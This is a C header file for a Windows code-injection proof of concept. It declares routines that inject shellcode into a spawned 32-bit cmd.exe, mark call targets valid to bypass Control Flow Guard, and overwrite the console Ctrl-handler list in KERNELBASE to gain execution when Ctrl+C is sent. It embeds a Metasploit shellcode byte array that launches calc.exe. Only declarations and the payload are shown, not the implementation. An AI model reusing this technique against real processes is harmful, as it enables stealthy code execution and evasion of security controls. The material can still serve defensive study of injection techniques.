#pragma once
#include <tchar.h>
#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <SDKDDKVer.h>
#include <Knownfolders.h>
#include <ShlObj.h>

#define CFG_CALL_TARGET_VALID   (0x00000001)

typedef struct _CFG_CALL_TARGET_INFO {
    ULONG_PTR Offset;
    ULONG_PTR Flags;
} CFG_CALL_TARGET_INFO, *PCFG_CALL_TARGET_INFO;

typedef struct _PROCESS_INFO {
    HANDLE hProcess;
    LPVOID lpBaseAddr;
    DWORD pid;
}PROCESS_INFO, *PPROCESS_INFO;

//Provides CFG with a list of valid indirect call
//targets and specifies whether they should be marked valid or not.
typedef BOOL(WINAPI *declaration_SetProcessValidCallTargets)(
    HANDLE hProcess,
    PVOID VirtualAddress,
    SIZE_T RegionSize,
    ULONG NumberOfOffsets,
    PCFG_CALL_TARGET_INFO OffsetInformation
    );

//Encodes a pointer in the target process and returns its value
typedef HRESULT(WINAPI *declaration_RtlEncodeRemotePointer)(
    HANDLE hProcess,
    PVOID Ptr,
    PVOID* EncodedPtr
    );

//Decodes a pointer in the targets process and returns its value
typedef HRESULT(WINAPI *declaration_RtlDecodeRemotePointer)(
    HANDLE hProcess,
    PVOID Ptr,
    PVOID* DecodedPtr
    );

WCHAR *Build32bitCmdPath();
DWORD StartVictimProcess(LPWSTR processName);
PPROCESS_INFO ShellcodeInjection(DWORD processId);
BOOL InitializeAPIs();
BOOL SetupValidPointer(PPROCESS_INFO ptrProcessInfo);
BOOL SearchForSetCtrlHandlerRoutine(PPROCESS_INFO ptrProcessInfo);
BOOL GetHandlerDataKernelBase(PPROCESS_INFO ptrProcessInfo);
BOOL ReadRemoteHandlerData(PPROCESS_INFO ptrProcessInfo);
BOOL PreformeOverwrite(PPROCESS_INFO ptrProcessInfo);
VOID CodeExecution(DWORD pid);
VOID SendCtrlC(HWND hWindow);
HWND GetWindowFromPID(DWORD mypid);

//function pointers
declaration_SetProcessValidCallTargets pfnSetProcessValidCallTargets = NULL;
declaration_RtlEncodeRemotePointer pfnRtlEncodeRemotePointer = NULL;
declaration_RtlDecodeRemotePointer pfnRtlDecodeRemotePointer = NULL;
LPVOID SetConsoleCtrlHandler_address = NULL;
LPVOID SetCtrlHandler_address = NULL;
PVOID pvEncodedPtr = NULL;
PVOID pvDecodedPtr = NULL;

//handler pointers in KERNELBASE
LPVOID HandlerListLength_kernelbase_adr = NULL;
LPVOID HandlerList_kernelbase_adr = NULL;

//handler pointers in the actuall target process
LPVOID HandlerListAddress = NULL;
LPVOID HandlerLenght = NULL;


/* F:\metasploit\metasploit-framework\bin\calc.bin (10/28/2018 8:44:28 PM)
StartOffset: 00000000, EndOffset: 000000C0, Length: 000000C1 */

unsigned char calc[193] = {
	0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xC0, 0x64,
	0x8B, 0x50, 0x30, 0x8B, 0x52, 0x0C, 0x8B, 0x52, 0x14, 0x8B, 0x72, 0x28,
	0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xFF, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C,
	0x20, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xE2, 0xF2, 0x52, 0x57, 0x8B, 0x52,
	0x10, 0x8B, 0x4A, 0x3C, 0x8B, 0x4C, 0x11, 0x78, 0xE3, 0x48, 0x01, 0xD1,
	0x51, 0x8B, 0x59, 0x20, 0x01, 0xD3, 0x8B, 0x49, 0x18, 0xE3, 0x3A, 0x49,
	0x8B, 0x34, 0x8B, 0x01, 0xD6, 0x31, 0xFF, 0xAC, 0xC1, 0xCF, 0x0D, 0x01,
	0xC7, 0x38, 0xE0, 0x75, 0xF6, 0x03, 0x7D, 0xF8, 0x3B, 0x7D, 0x24, 0x75,
	0xE4, 0x58, 0x8B, 0x58, 0x24, 0x01, 0xD3, 0x66, 0x8B, 0x0C, 0x4B, 0x8B,
	0x58, 0x1C, 0x01, 0xD3, 0x8B, 0x04, 0x8B, 0x01, 0xD0, 0x89, 0x44, 0x24,
	0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF, 0xE0, 0x5F, 0x5F, 0x5A,
	0x8B, 0x12, 0xEB, 0x8D, 0x5D, 0x6A, 0x01, 0x8D, 0x85, 0xB2, 0x00, 0x00,
	0x00, 0x50, 0x68, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5,
	0xA2, 0x56, 0x68, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x3C, 0x06, 0x7C,
	0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A,
	0x00, 0x53, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65,
	0x00
};